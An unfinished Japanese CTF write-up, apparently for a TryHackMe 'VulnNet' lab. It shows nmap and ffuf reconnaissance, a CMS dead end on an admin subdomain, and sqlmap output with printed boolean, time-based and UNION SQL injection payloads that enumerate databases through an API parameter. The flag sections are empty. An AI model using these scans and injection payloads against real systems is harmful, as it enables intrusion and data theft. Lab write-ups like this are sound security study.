### Enum
```
nmap -Pn -sVC 10.10.133.73 -p 22,80 
Nmap scan report for vulnnet.thm (10.10.133.73)
Host is up.

PORT   STATE    SERVICE VERSION
22/tcp filtered ssh
80/tcp filtered http
```
```
nmap -Pn -sVC 10.10.133.73 -p 22,80 -vv -T4
Host is up, received user-set (0.39s latency).

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bb2ee6cc79f47d682c11bc4b631908af (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6xhSTxgS3q6xVmL6UU3hIbpiXzYcj2vxuAXXszyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
|   256 8061bf8caad14d4468154533edeb82a7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
|   256 878604e9e0c0602aab878e9bc705351c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Soon &mdash; Fully Responsive Software Design by VulnNet
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Webサーバ。Fuzzしたけど空振りなので、サブドメインを探す。

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://vulnnet.thm -H "HOST:FUZZ.vulnnet.thm" -fs 65
________________________________________________

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://vulnnet.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.vulnnet.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 65
________________________________________________

[Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 405ms]
    * FUZZ: blog

[Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 415ms]
    * FUZZ: shop

[Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 610ms]
    * FUZZ: api

[Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 5123ms]
    * FUZZ: admin1

:: Progress: [4989/4989] :: Job [1/1] :: 69 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

![image](https://user-images.githubusercontent.com/6504854/236607640-bfe5efd8-044a-4373-bf3b-62dd0be28535.png)

![image](https://user-images.githubusercontent.com/6504854/236607654-5b3745ca-e0d5-405e-9157-5efc5e5ecd24.png)

![image](https://user-images.githubusercontent.com/6504854/236607673-c57f2473-4188-4800-a3c4-cded88425095.png)

![image](https://user-images.githubusercontent.com/6504854/236607683-bff21815-5b2e-40c2-829e-6b3996937bda.png)

こんな感じで、問題からadmin1が最優先だろというあたりで。（これが Rabbit Hole）

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://admin1.vulnnet.thm/FUZZ -fc 307

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://admin1.vulnnet.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 307
________________________________________________

[Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 359ms]
    * FUZZ: en

[Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 346ms]
    * FUZZ: vendor

[Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 352ms]
    * FUZZ: fileadmin

[Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 409ms]
    * FUZZ: typo3temp

```

![image](https://user-images.githubusercontent.com/6504854/236608456-b5108f57-ea21-4493-b17b-1de6d3a1fc50.png)

![image](https://user-images.githubusercontent.com/6504854/236608468-f55e3828-3e63-42e5-aca9-f0c497434498.png)

![image](https://user-images.githubusercontent.com/6504854/236608493-e1d069ea-db66-40ec-b6f9-b3875989d983.png)

![image](https://user-images.githubusercontent.com/6504854/236608515-e0654256-c3b7-4603-ad2e-9cb2bda34e86.png)

なんかのCMSらしい。

![image](https://user-images.githubusercontent.com/6504854/236608679-03abb9be-8dcf-4396-9f85-0c3906137830.png)

デフォルトの設定のままでログイン口がみえる。admin/adminで入れない。古いバージョンだとRCEあるっぽいけど、履歴から割と最近のバージョン10以上っぽい。
めぼしいエクスプロイトなし。どうしたものか。どっかからユーザ探す？。

![image](https://user-images.githubusercontent.com/6504854/236609100-b07925ae-8b0d-4f74-bd90-6d4999326ca8.png)

このパラメータにSQLiがある。ここ探すのが一番時間かかった。

![image](https://user-images.githubusercontent.com/6504854/236610784-c9de7923-30a9-4d4c-a1db-3501d3b52838.png)

![image](https://user-images.githubusercontent.com/6504854/236610823-3d182be4-1d0f-4666-a17d-75f3f39fbec4.png)

```
sqlmap -u http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=4 -p blog --batch --dbs                 
        ___
       __H__                                                                                                              
 ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                  
|_ -| . [.]     | .'| . |                                                                                                 
|___|_  [']_|_|_|__,|  _|                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[16:47:03] [INFO] resuming back-end DBMS 'mysql' 
[16:47:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: blog (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: blog=5 AND 7604=7604

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blog=5 AND (SELECT 7299 FROM (SELECT(SLEEP(5)))ituG)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: blog=-4953 UNION ALL SELECT NULL,NULL,CONCAT(0x7171707671,0x4850476a6f59766d4e696c5849744b53544e506b495773795a667544496444614762415a4f446b68,0x7178767a71)-- -
---
[16:47:04] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[16:47:04] [INFO] fetching database names
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin

[16:47:04] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/api.vulnnet.thm'
```

### Flag(User)

### Flag(Root)


地震はくるわ、風が強すぎるわ、隠れて生きのびていこ。
